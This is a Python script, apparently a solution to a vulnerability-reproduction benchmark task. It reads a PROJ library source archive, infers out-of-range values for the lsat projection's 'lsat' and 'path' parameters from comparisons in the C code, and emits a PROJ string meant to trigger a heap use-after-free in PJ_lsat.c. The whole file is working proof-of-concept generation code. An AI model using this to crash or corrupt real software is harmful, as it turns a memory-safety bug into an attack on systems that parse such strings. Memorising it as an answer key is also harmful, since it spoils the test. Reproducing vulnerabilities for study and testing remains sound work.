import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free in PJ_lsat.c
        by constructing a PROJ string for the lsat projection with
        intentionally invalid lsat/path parameters, inferred from the
        source if possible.
        """
        lsat_value = -1
        path_value = -1

        try:
            with tarfile.open(src_path, "r:*") as tf:
                member = None
                for m in tf.getmembers():
                    name = m.name.lower()
                    if name.endswith("pj_lsat.c") or name.endswith("/lsat.c") or name.endswith("lsat.c"):
                        member = m
                        break

                if member is not None:
                    f = tf.extractfile(member)
                    if f is not None:
                        text = f.read().decode("utf-8", errors="ignore")
                        lsat_value = self._choose_invalid_value(text, "lsat", default=-1)
                        path_value = self._choose_invalid_value(text, "path", default=-1)
        except Exception:
            # On any failure, fall back to a generic invalid configuration
            lsat_value = -1
            path_value = -1

        poc_str = f"+proj=lsat +lsat={lsat_value} +path={path_value}"
        return poc_str.encode("ascii", errors="ignore")

    @staticmethod
    def _choose_invalid_value(text: str, var_name: str, default: int) -> int:
        """
        Heuristically infer an out-of-range / invalid integer value for
        a parameter by looking at comparisons in the C source.

        We scan for patterns like:
            var_name < 1
            var_name <= 0
            var_name > 5
            var_name >= 10
            var_name == 3
            var_name != 2

        and synthesize a value that will likely make such conditions true.
        """
        pattern = re.compile(rf"{var_name}\s*([<>!=]=?)\s*(-?\d+)")
        comps = []

        for m in pattern.finditer(text):
            op = m.group(1)
            num_str = m.group(2)
            try:
                n = int(num_str)
            except ValueError:
                continue
            comps.append((op, n))

        for op, n in comps:
            if op == "<":
                return n - 1
            elif op == "<=":
                return n - 1
            elif op == ">":
                return n + 1
            elif op == ">=":
                return n + 1
            elif op == "==":
                # If code checks "== n" inside an error path, using n should
                # trigger it. This is less likely than range checks, but safe.
                return n
            elif op == "!=":
                # Pick a value different from n; n+1 is fine.
                return n + 1

        # Fallback if no comparisons found
        return default